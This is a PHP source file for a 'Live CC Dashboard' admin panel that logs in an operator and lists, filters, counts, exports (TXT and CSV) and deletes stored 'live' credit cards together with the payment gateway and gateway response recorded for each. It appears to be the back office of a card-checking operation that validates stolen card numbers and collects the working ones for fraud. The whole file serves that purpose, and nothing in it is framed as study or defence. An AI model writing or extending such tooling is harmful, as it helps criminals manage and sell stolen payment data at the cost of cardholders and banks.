<?php
/**
 * Admin Panel - Live CC Statistics & Management
 * Advanced admin panel with date filtering, export, mass delete
 */

session_start();

// --- Credentials (hashed) ---
define('ADMIN_USER', 'mpragans');
define('ADMIN_PASS_HASH', '$2y$10$IKKoBnq7aX23MRJ/lAj1/e.S9HXECshJCVUSHyOBxsf9i4/N.WJdu');

$DATA_FILE = __DIR__ . '/../data/live_cards.json';

// --- Helpers ---
function isLoggedIn() {
    return isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;
}

function loadCards($file) {
    if (!file_exists($file)) return [];
    $data = json_decode(file_get_contents($file), true);
    return is_array($data) ? $data : [];
}

function saveCards($file, $cards) {
    file_put_contents($file, json_encode(array_values($cards), JSON_PRETTY_PRINT), LOCK_EX);
}

function getCardDate($card) {
    return isset($card['timestamp']) ? substr($card['timestamp'], 0, 10) : '';
}

// --- Handle logout ---
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// --- Handle login ---
$loginError = '';
if (!isLoggedIn() && isset($_POST['username'], $_POST['password'])) {
    if ($_POST['username'] === ADMIN_USER && password_verify($_POST['password'], ADMIN_PASS_HASH)) {
        $_SESSION['admin_logged_in'] = true;
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        $loginError = 'Invalid username or password.';
    }
}

// --- Handle actions (only if logged in) ---
if (isLoggedIn()) {
    $cards = loadCards($DATA_FILE);

    // Export (TXT or CSV)
    if (isset($_GET['export'])) {
        $exportDate = $_GET['export_date'] ?? '';
        $exportType = $_GET['export_type'] ?? '';
        $exportFormat = $_GET['export'] ?? 'txt';

        $filtered = $cards;
        if ($exportDate !== '' && $exportDate !== 'all') {
            $filtered = array_filter($cards, fn($c) => getCardDate($c) === $exportDate);
        }
        if ($exportType !== '' && $exportType !== 'all') {
            $filtered = array_filter($filtered, fn($c) => ($c['card_type'] ?? '') === $exportType);
        }

        if ($exportFormat === 'csv') {
            header('Content-Type: text/csv');
            header('Content-Disposition: attachment; filename="live_cards_' . ($exportDate ?: 'all') . '.csv"');
            echo "Card,Type,Gateway,Status,Response,Timestamp\n";
            foreach ($filtered as $c) {
                echo '"' . str_replace('"', '""', $c['card'] ?? '') . '","'
                    . str_replace('"', '""', $c['card_type'] ?? '') . '","'
                    . str_replace('"', '""', $c['gateway'] ?? '') . '","'
                    . str_replace('"', '""', $c['status'] ?? '') . '","'
                    . str_replace('"', '""', $c['response'] ?? '') . '","'
                    . str_replace('"', '""', $c['timestamp'] ?? '') . "\"\n";
            }
        } else {
            header('Content-Type: text/plain');
            header('Content-Disposition: attachment; filename="live_cards_' . ($exportDate ?: 'all') . '.txt"');
            foreach ($filtered as $c) {
                echo ($c['card'] ?? '') . "\n";
            }
        }
        exit;
    }

    // Delete single
    if (isset($_POST['delete_index'])) {
        $index = intval($_POST['delete_index']);
        if (isset($cards[$index])) {
            array_splice($cards, $index, 1);
            saveCards($DATA_FILE, $cards);
        }
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?') . (isset($_GET['date']) ? '?date=' . urlencode($_GET['date']) : ''));
        exit;
    }

    // Mass delete by date
    if (isset($_POST['mass_delete_date']) && $_POST['mass_delete_date'] !== '') {
        $delDate = $_POST['mass_delete_date'];
        $cards = array_filter($cards, fn($c) => getCardDate($c) !== $delDate);
        saveCards($DATA_FILE, $cards);
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    }

    // Mass delete selected
    if (isset($_POST['delete_selected']) && isset($_POST['selected'])) {
        $selected = array_map('intval', $_POST['selected']);
        rsort($selected);
        foreach ($selected as $idx) {
            if (isset($cards[$idx])) {
                array_splice($cards, $idx, 1);
            }
        }
        saveCards($DATA_FILE, $cards);
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?') . (isset($_GET['date']) ? '?date=' . urlencode($_GET['date']) : ''));
        exit;
    }

    // Clear all
    if (isset($_POST['clear_all']) && $_POST['clear_all'] === 'confirm') {
        saveCards($DATA_FILE, []);
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    }
}

// --- Login Form ---
if (!isLoggedIn()) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',sans-serif;background:#1a1b1e;color:#a0a3b1;min-height:100vh;display:flex;align-items:center;justify-content:center}
.login-box{background:#26272c;border-radius:12px;padding:2rem;width:100%;max-width:360px;box-shadow:0 8px 32px rgba(0,0,0,.25)}
.login-box h2{color:#fff;text-align:center;margin-bottom:1.5rem;font-size:1.2rem}
.login-box input{width:100%;padding:.7rem 1rem;margin-bottom:1rem;border:1px solid #3a3b40;border-radius:8px;background:#1a1b1e;color:#fff;font-size:.9rem;outline:none}
.login-box input:focus{border-color:#3b82f6}
.login-box button{width:100%;padding:.7rem;border:none;border-radius:8px;background:#10b981;color:#fff;font-weight:600;cursor:pointer;font-size:.9rem}
.login-box button:hover{background:#059669}
.error{color:#ef4444;text-align:center;margin-bottom:1rem;font-size:.85rem}
</style>
</head>
<body>
<div class="login-box">
  <h2>Admin Panel</h2>
  <?php if ($loginError): ?><div class="error"><?= htmlspecialchars($loginError) ?></div><?php endif; ?>
  <form method="post">
    <input type="text" name="username" placeholder="Username" required autocomplete="username">
    <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
    <button type="submit">Login</button>
  </form>
</div>
</body>
</html>
<?php
    exit;
}

// ============================
// DASHBOARD
// ============================
$cards = loadCards($DATA_FILE);
$totalLive = count($cards);

// Collect all unique dates
$allDates = [];
foreach ($cards as $c) {
    $d = getCardDate($c);
    if ($d) $allDates[$d] = ($allDates[$d] ?? 0) + 1;
}
krsort($allDates);

// Collect all unique card types
$allTypes = [];
foreach ($cards as $c) {
    $t = $c['card_type'] ?? 'Unknown';
    $allTypes[$t] = ($allTypes[$t] ?? 0) + 1;
}

// Date filter
$filterDate = $_GET['date'] ?? 'all';
$filterType = $_GET['type'] ?? 'all';

$filtered = $cards;
if ($filterDate !== 'all') {
    $filtered = array_filter($filtered, fn($c) => getCardDate($c) === $filterDate);
}
if ($filterType !== 'all') {
    $filtered = array_filter($filtered, fn($c) => ($c['card_type'] ?? 'Unknown') === $filterType);
}
// Preserve original indices for delete operations
$filteredWithIndex = [];
foreach ($cards as $i => $c) {
    $match = true;
    if ($filterDate !== 'all' && getCardDate($c) !== $filterDate) $match = false;
    if ($filterType !== 'all' && ($c['card_type'] ?? 'Unknown') !== $filterType) $match = false;
    if ($match) $filteredWithIndex[$i] = $c;
}

$filteredCount = count($filteredWithIndex);

$today = date('Y-m-d');
$yesterday = date('Y-m-d', strtotime('-1 day'));
$todayCount = $allDates[$today] ?? 0;
$yesterdayCount = $allDates[$yesterday] ?? 0;

// Last 7 days count
$last7 = 0;
for ($d = 0; $d < 7; $d++) {
    $dk = date('Y-m-d', strtotime("-{$d} days"));
    $last7 += $allDates[$dk] ?? 0;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Panel - Live Cards</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',-apple-system,sans-serif;background:#1a1b1e;color:#a0a3b1;min-height:100vh;padding:1.2rem}
a{color:#3b82f6;text-decoration:none}
a:hover{text-decoration:underline}
.container{max-width:1100px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1.2rem;flex-wrap:wrap;gap:.5rem}
.header h1{color:#fff;font-size:1.3rem}
.header-actions{display:flex;gap:.5rem;align-items:center;flex-wrap:wrap}
.btn{border:none;padding:.45rem .9rem;border-radius:8px;cursor:pointer;font-size:.82rem;font-weight:600;transition:all .2s}
.btn-logout{background:#ef4444;color:#fff}.btn-logout:hover{background:#dc2626}
.btn-export{background:#3b82f6;color:#fff}.btn-export:hover{background:#2563eb}
.btn-danger{background:#ef4444;color:#fff}.btn-danger:hover{background:#dc2626}
.btn-warn{background:#f59e0b;color:#fff}.btn-warn:hover{background:#d97706}
.btn-success{background:#10b981;color:#fff}.btn-success:hover{background:#059669}
.btn-ghost{background:transparent;border:1px solid #3a3b40;color:#a0a3b1}.btn-ghost:hover{border-color:#fff;color:#fff}
.btn-sm{padding:.3rem .6rem;font-size:.75rem}

/* Stats */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:.8rem;margin-bottom:1.2rem}
.stat-card{background:#26272c;border-radius:10px;padding:1rem;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.15);transition:transform .2s}
.stat-card:hover{transform:translateY(-2px)}
.stat-card .number{font-size:1.8rem;font-weight:700;color:#10b981}
.stat-card .number.blue{color:#3b82f6}
.stat-card .number.yellow{color:#f59e0b}
.stat-card .number.purple{color:#a855f7}
.stat-card .label{font-size:.75rem;color:#616370;margin-top:.2rem}

/* Toolbar */
.toolbar{background:#26272c;border-radius:10px;padding:.8rem 1rem;margin-bottom:1rem;display:flex;flex-wrap:wrap;gap:.6rem;align-items:center;box-shadow:0 2px 8px rgba(0,0,0,.15)}
.toolbar label{font-size:.8rem;color:#616370;font-weight:600}
.toolbar select,.toolbar input[type="date"]{background:#1a1b1e;color:#fff;border:1px solid #3a3b40;border-radius:6px;padding:.35rem .5rem;font-size:.82rem;outline:none}
.toolbar select:focus,.toolbar input:focus{border-color:#3b82f6}
.sep{width:1px;height:24px;background:#3a3b40;margin:0 .3rem}

/* Date tabs */
.date-tabs{display:flex;gap:.4rem;flex-wrap:wrap;margin-bottom:1rem}
.date-tab{padding:.35rem .8rem;border-radius:8px;font-size:.8rem;cursor:pointer;border:1px solid #3a3b40;color:#a0a3b1;background:transparent;transition:all .2s;text-decoration:none}
.date-tab:hover{border-color:#3b82f6;color:#fff;text-decoration:none}
.date-tab.active{background:#3b82f6;color:#fff;border-color:#3b82f6}
.date-tab .count{font-size:.7rem;opacity:.7;margin-left:4px}

/* Table */
.table-wrap{background:#26272c;border-radius:10px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,.2)}
.table-header{display:flex;justify-content:space-between;align-items:center;padding:.8rem 1rem;border-bottom:1px solid #3a3b40;flex-wrap:wrap;gap:.5rem}
.table-header h2{color:#fff;font-size:.95rem}
.table-actions{display:flex;gap:.4rem;flex-wrap:wrap}
table{width:100%;border-collapse:collapse}
th{background:#2d2e33;color:#616370;font-size:.72rem;text-transform:uppercase;letter-spacing:.5px;padding:.6rem .8rem;text-align:left;position:sticky;top:0}
td{padding:.5rem .8rem;border-bottom:1px solid #2d2e33;font-size:.82rem;color:#a0a3b1}
tr:hover td{background:rgba(59,130,246,.05)}
.badge{display:inline-block;padding:2px 8px;border-radius:6px;font-size:.72rem;font-weight:600}
.badge-live{background:rgba(16,185,129,.15);color:#10b981}
.badge-date{background:rgba(59,130,246,.12);color:#3b82f6}
.cc-num{font-family:'Courier New',monospace;color:#fff;font-size:.82rem;letter-spacing:.5px}
.empty{text-align:center;padding:3rem;color:#616370}
.cb{width:16px;height:16px;accent-color:#3b82f6;cursor:pointer}

/* Mass delete section */
.mass-del{background:#26272c;border-radius:10px;padding:1rem;margin-bottom:1rem;box-shadow:0 2px 8px rgba(0,0,0,.15)}
.mass-del h3{color:#fff;font-size:.9rem;margin-bottom:.7rem}
.mass-del-grid{display:flex;flex-wrap:wrap;gap:.5rem;align-items:center}
.del-date-item{display:flex;align-items:center;gap:.4rem;background:#1a1b1e;border-radius:8px;padding:.4rem .7rem}
.del-date-item span{font-size:.82rem;color:#a0a3b1;min-width:100px}
.del-date-item .cnt{font-size:.75rem;color:#616370}

/* Responsive table scroll */
.table-scroll{overflow-x:auto;max-height:70vh;overflow-y:auto}

@media(max-width:600px){
  .stats{grid-template-columns:repeat(2,1fr)}
  .toolbar{flex-direction:column;align-items:stretch}
  .header{flex-direction:column;align-items:flex-start}
}
</style>
</head>
<body>
<div class="container">
  <!-- Header -->
  <div class="header">
    <h1>Live CC Dashboard</h1>
    <div class="header-actions">
      <a href="?logout=1" class="btn btn-logout">Logout</a>
    </div>
  </div>

  <!-- Stats -->
  <div class="stats">
    <div class="stat-card">
      <div class="number"><?= $totalLive ?></div>
      <div class="label">Total Live</div>
    </div>
    <div class="stat-card">
      <div class="number blue"><?= $todayCount ?></div>
      <div class="label">Today</div>
    </div>
    <div class="stat-card">
      <div class="number yellow"><?= $yesterdayCount ?></div>
      <div class="label">Yesterday</div>
    </div>
    <div class="stat-card">
      <div class="number purple"><?= $last7 ?></div>
      <div class="label">Last 7 Days</div>
    </div>
    <?php foreach ($allTypes as $type => $count): ?>
    <div class="stat-card">
      <div class="number"><?= $count ?></div>
      <div class="label"><?= htmlspecialchars($type) ?></div>
    </div>
    <?php endforeach; ?>
  </div>

  <!-- Date Tabs Filter -->
  <div class="date-tabs">
    <a href="?date=all<?= $filterType !== 'all' ? '&type=' . urlencode($filterType) : '' ?>" class="date-tab <?= $filterDate === 'all' ? 'active' : '' ?>">All<span class="count">(<?= $totalLive ?>)</span></a>
    <?php foreach ($allDates as $date => $cnt): 
      $label = $date;
      if ($date === $today) $label = 'Today';
      elseif ($date === $yesterday) $label = 'Yesterday';
    ?>
    <a href="?date=<?= urlencode($date) ?><?= $filterType !== 'all' ? '&type=' . urlencode($filterType) : '' ?>" class="date-tab <?= $filterDate === $date ? 'active' : '' ?>"><?= htmlspecialchars($label) ?><?php if ($label !== $date): ?> <span style="font-size:.7rem;opacity:.6"><?= $date ?></span><?php endif; ?><span class="count">(<?= $cnt ?>)</span></a>
    <?php endforeach; ?>
  </div>

  <!-- Toolbar: Type filter + Export -->
  <div class="toolbar">
    <label>Card Type:</label>
    <select onchange="location.href='?date=<?= urlencode($filterDate) ?>&type='+this.value">
      <option value="all" <?= $filterType === 'all' ? 'selected' : '' ?>>All Types</option>
      <?php foreach ($allTypes as $type => $cnt): ?>
      <option value="<?= htmlspecialchars($type) ?>" <?= $filterType === $type ? 'selected' : '' ?>><?= htmlspecialchars($type) ?> (<?= $cnt ?>)</option>
      <?php endforeach; ?>
    </select>

    <div class="sep"></div>

    <label>Export:</label>
    <a href="?export=txt&export_date=<?= urlencode($filterDate) ?>&export_type=<?= urlencode($filterType) ?>" class="btn btn-export btn-sm">TXT</a>
    <a href="?export=csv&export_date=<?= urlencode($filterDate) ?>&export_type=<?= urlencode($filterType) ?>" class="btn btn-export btn-sm">CSV</a>

    <div class="sep"></div>

    <label>Showing: <strong style="color:#fff"><?= $filteredCount ?></strong> cards</label>
  </div>

  <!-- Mass Delete by Date -->
  <?php if (count($allDates) > 0): ?>
  <div class="mass-del">
    <h3>Mass Delete by Date</h3>
    <div class="mass-del-grid">
      <?php foreach ($allDates as $date => $cnt): 
        $dlabel = $date;
        if ($date === $today) $dlabel = "Today ($date)";
        elseif ($date === $yesterday) $dlabel = "Yesterday ($date)";
      ?>
      <div class="del-date-item">
        <span><?= htmlspecialchars($dlabel) ?></span>
        <span class="cnt"><?= $cnt ?> cards</span>
        <form method="post" style="display:inline" onsubmit="return confirm('Delete all <?= $cnt ?> cards from <?= htmlspecialchars($date) ?>?')">
          <input type="hidden" name="mass_delete_date" value="<?= htmlspecialchars($date) ?>">
          <button type="submit" class="btn btn-danger btn-sm">Delete</button>
        </form>
      </div>
      <?php endforeach; ?>
    </div>
  </div>
  <?php endif; ?>

  <!-- Cards Table -->
  <form method="post" id="bulkForm">
  <div class="table-wrap">
    <div class="table-header">
      <h2>Live Cards (<?= $filteredCount ?>)</h2>
      <div class="table-actions">
        <?php if ($filteredCount > 0): ?>
        <button type="submit" name="delete_selected" value="1" class="btn btn-warn btn-sm" onclick="return confirm('Delete selected cards?')">Delete Selected</button>
        <?php endif; ?>
        <?php if ($totalLive > 0): ?>
        <button type="button" class="btn btn-danger btn-sm" onclick="if(confirm('Clear ALL live cards?')){document.getElementById('clearForm').submit()}">Clear All</button>
        <?php endif; ?>
      </div>
    </div>
    <?php if ($filteredCount === 0): ?>
      <div class="empty">No live cards found<?= $filterDate !== 'all' ? ' for this date' : '' ?>.</div>
    <?php else: ?>
    <div class="table-scroll">
    <table>
      <thead>
        <tr>
          <th><input type="checkbox" class="cb" id="selectAll" onclick="toggleAll(this)"></th>
          <th>#</th>
          <th>Card</th>
          <th>Type</th>
          <th>Gateway</th>
          <th>Status</th>
          <th>Response</th>
          <th>Date</th>
          <th>Time</th>
          <th></th>
        </tr>
      </thead>
      <tbody>
        <?php $row = 0; foreach (array_reverse($filteredWithIndex, true) as $i => $c): $row++; ?>
        <tr>
          <td><input type="checkbox" class="cb row-cb" name="selected[]" value="<?= $i ?>"></td>
          <td><?= $row ?></td>
          <td class="cc-num"><?= htmlspecialchars($c['card'] ?? '') ?></td>
          <td><span class="badge badge-live"><?= htmlspecialchars($c['card_type'] ?? 'Unknown') ?></span></td>
          <td><?= htmlspecialchars($c['gateway'] ?? '') ?></td>
          <td><span class="badge badge-live"><?= htmlspecialchars($c['status'] ?? '') ?></span></td>
          <td><?= htmlspecialchars($c['response'] ?? '') ?></td>
          <td><span class="badge badge-date"><?= htmlspecialchars(getCardDate($c)) ?></span></td>
          <td><?= htmlspecialchars(substr($c['timestamp'] ?? '', 11)) ?></td>
          <td>
            <button type="button" class="btn btn-danger btn-sm" onclick="if(confirm('Delete?')){delSingle(<?= $i ?>)}">Del</button>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
    </div>
    <?php endif; ?>
  </div>
  </form>

  <!-- Hidden forms -->
  <form method="post" id="clearForm" style="display:none">
    <input type="hidden" name="clear_all" value="confirm">
  </form>
  <form method="post" id="delSingleForm" style="display:none">
    <input type="hidden" name="delete_index" id="delIdx" value="">
  </form>
</div>

<script>
function toggleAll(master) {
  document.querySelectorAll('.row-cb').forEach(cb => cb.checked = master.checked);
}
function delSingle(idx) {
  document.getElementById('delIdx').value = idx;
  document.getElementById('delSingleForm').submit();
}
</script>
</body>
</html>
<?php exit; ?>
